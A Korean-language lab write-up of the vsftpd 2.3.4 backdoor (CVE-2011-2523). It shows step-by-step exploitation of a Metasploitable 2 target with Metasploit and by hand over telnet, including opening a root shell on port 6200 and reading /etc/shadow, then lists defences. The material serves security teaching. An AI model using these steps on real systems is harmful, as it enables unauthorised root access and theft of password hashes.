Security Architecture Lab

CVE-2011-2523 : vsftpd 2.3.4 Backdoor Command Execution

CVSS: 10.0 (CRITICAL)

1. 취약점 개요 (Vulnerability Overview)

이 취약점은 역사상 가장 유명한 공급망 공격 (Supply Chain Attack, 소프트웨어 배포 과정에 악성코드를 삽입하는 공격) 사례 중 하나입니다. 2011년, 누군가 vsftpd (Very Secure FTP Daemon, 매우 보안이 강화된 파일 전송 프로토콜 데몬) 프로젝트의 마스터 서버에 침입하여 소스 코드에 악의적인 백도어를 삽입했습니다.

그림 1: vsftpd 2.3.4 백도어 트리거 및 리버스 쉘 연결 아키텍처

작동 원리 (Mechanism)

사용자가 FTP 서버에 접속하여 USER 명령어를 보낼 때, 식별자 끝에 스마일리 이모티콘인 :) 문자를 포함시키면 서버 백그라운드에서 임의의 소켓이 열립니다. 이 소켓은 TCP 6200번 포트에서 대기(Listening)하며, 해당 포트로 접속하는 누구에게나 루트(Root) 권한의 쉘(Shell, 운영체제 명령어 해석기)을 제공하게 됩니다.

2. 실습 환경 (Lab Environment)

Attacker

공격자 시스템

  • OS: Kali Linux (칼리 리눅스)
  • 도구: MSF (Metasploit Framework, 메타스플로잇 프레임워크)
  • IP 예시: 192.168.50.10
Target

타겟 시스템

  • OS: Metasploitable 2 (메타스플로이터블 2)
  • 서비스: vsftpd v2.3.4 (TCP 21 포트 개방)
  • IP 예시: 192.168.50.100

AWS 실습 인프라 구축 시 주의사항 (과금 및 보안 경고)

해당 실습을 위해 AWS EC2 (Elastic Compute Cloud, 아마존 탄력적 클라우드 컴퓨팅) 인스턴스를 구축할 경우, 보안 그룹 (Security Group)의 인바운드 규칙에서 TCP 21 및 TCP 6200 포트를 절대 0.0.0.0/0 (전체 허용)으로 개방해서는 안 됩니다. 전 세계의 자동화된 봇(Bot)들이 취약점을 스캔하여 시스템을 탈취하고, 크립토 마이닝 (Crypto Mining, 암호화폐 채굴) 스크립트를 삽입하여 막대한 클라우드 요금이 과금될 수 있습니다. 반드시 본인의 공인 IP에서만 접근 가능하도록 제한하십시오.

3. 메타스플로잇 (Metasploit) 기반 자동화 공격

Step 1. 프레임워크 실행

┌──(root㉿kali)-[~]
└─# msfconsole -q
msf6 >

설명: msfconsole 명령어는 메타스플로잇 프레임워크의 대화형 콘솔(CLI) 환경을 시작합니다. -q (quiet) 옵션을 주면 초기 실행 시 나타나는 배너(그림)를 생략하고 빠르게 프롬프트를 띄웁니다.

Step 2. 공격 모듈 검색

msf6 > search vsftpd
Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution

설명: search 명령어를 통해 로컬 데이터베이스에 저장된 vsftpd 관련 취약점 모듈을 검색합니다. 검색 결과 중 Rank가 excellent(매우 높음, 시스템을 멈추게 하지 않고 안정적으로 쉘을 획득함)인 백도어 모듈을 확인할 수 있습니다.

Step 3. 모듈 선택 및 타겟 설정

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.50.100
RHOSTS => 192.168.50.100
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
Module options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.50.100 yes The target host(s), see https://docs.metasploit.com/ RPORT 21 yes The target port (TCP)

결과 분석: use 명령어로 식별된 경로의 모듈을 로드합니다. 프롬프트가 모듈 이름으로 변경되어 해당 모듈 컨텍스트 안으로 진입했음을 나타냅니다.

변수 설정: set RHOSTS [타겟 IP] 명령은 RHOSTS (Remote Hosts, 원격 타겟 시스템 호스트) 변수를 설정합니다. 공격할 대상의 IP 주소입니다. show options로 필수(Required) 항목들이 제대로 채워졌는지 검증합니다. RPORT는 기본값인 21번(FTP) 포트로 자동 지정되어 있습니다.

Step 4. 익스플로잇 (Exploit) 실행 및 쉘 획득

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.50.100:21 - Banner: 220 (vsFTPd 2.3.4) [*] 192.168.50.100:21 - USER: 331 Please specify the password. [+] 192.168.50.100:21 - Backdoor service has been spawned, handling... [+] 192.168.50.100:21 - UID: uid=0(root) gid=0(root) groups=0(root) [*] Found shell. [*] Command shell session 1 opened (192.168.50.10:39485 -> 192.168.50.100:6200) at 2026-03-18 05:30:00 +0900 whoami root hostname metasploitable

결과 분석: exploit 명령어를 입력하면 모듈이 실행됩니다.

  • Banner 확인: 대상 포트에 접속하여 데몬 버전이 취약한 2.3.4 버전이 맞는지 배너그래빙(Banner Grabbing)을 수행합니다.
  • USER 명령 전송: 무작위 문자열 뒤에 :) 이모티콘이 포함된 계정명을 전송하여 백도어를 발동(Spawn)시킵니다.
  • Session Opened: 타겟의 6200번 포트로 백그라운드 연결을 성공적으로 맺고, 세션 1(Session 1)을 오픈합니다. 이제 공격자는 원격 서버의 최상위 관리자(root) 권한으로 임의의 시스템 명령(whoami, hostname 등)을 수행할 수 있습니다.

4. 수동 공격 기법 (Manual Exploitation via Telnet)

이 취약점의 구조가 매우 단순하기 때문에 메타스플로잇과 같은 공격 프레임워크 없이도, 터미널에서 기본 제공되는 Telnet (텔넷, 원격 터미널 접속 프로토콜)을 이용하여 수동으로 백도어를 트리거하고 접근할 수 있습니다. 시스템의 원리를 이해하는 데 중요한 실습입니다.

터미널 1: 백도어 트리거 (21번 포트)

# telnet 192.168.50.100 21
Trying 192.168.50.100...
Connected to 192.168.50.100.
220 (vsFTPd 2.3.4)
USER hello:)
331 Please specify the password.
PASS 1234
^C (연결 대기 상태로 두고 터미널 2 열기)

터미널 2: 백도어 접속 (6200번 포트)

# telnet 192.168.50.100 6200
Trying 192.168.50.100...
Connected to 192.168.50.100.
id
uid=0(root) gid=0(root)
cat /etc/shadow
root:$6$..... (비밀번호 해시 출력)

5. 아키텍트 인사이트 및 보안 대책

  • 무결성 검증 (Integrity Check)의 중요성

    공식 사이트에서 다운로드한 소프트웨어라 할지라도, 저장소가 해킹되어 파일이 변조되었을 가능성이 존재합니다. 오픈 소스 패키지를 운영 서버에 설치하기 전에는 반드시 배포자가 제공하는 해시값 (Hash, SHA-256 등 단방향 암호화 서명)을 확인하여 코드가 임의로 변경되지 않았는지 검증하는 파이프라인(DevSecOps)이 필요합니다.

  • 네트워크 분리 및 포트 모니터링 (Network Segmentation)

    인프라 아키텍처 관점에서, FTP 서버와 같이 외부에 노출되는 DMZ (Demilitarized Zone, 비무장지대 - 외부망과 내부망 사이의 완충 영역)의 서버들은 철저한 네트워크 접근 제어(ACL)가 필요합니다. 승인되지 않은 포트(예: 6200번)가 바인딩되어 외부로 열리는 행위를 IDS/IPS (침입 탐지/차단 시스템) 또는 클라우드의 VPC Flow Logs를 통해 실시간으로 감시하고 차단해야 합니다.

  • 취약점 패치 (Patch Management)

    현재 vsftpd는 지속적인 업데이트를 통해 해당 백도어 취약점이 제거된 버전을 제공하고 있습니다. 운영 중인 서버의 패키지 버전을 정기적으로 스캐닝하고 최신 안정화 버전으로 유지보수(Update & Upgrade)하는 것이 인프라 운영의 핵심입니다.
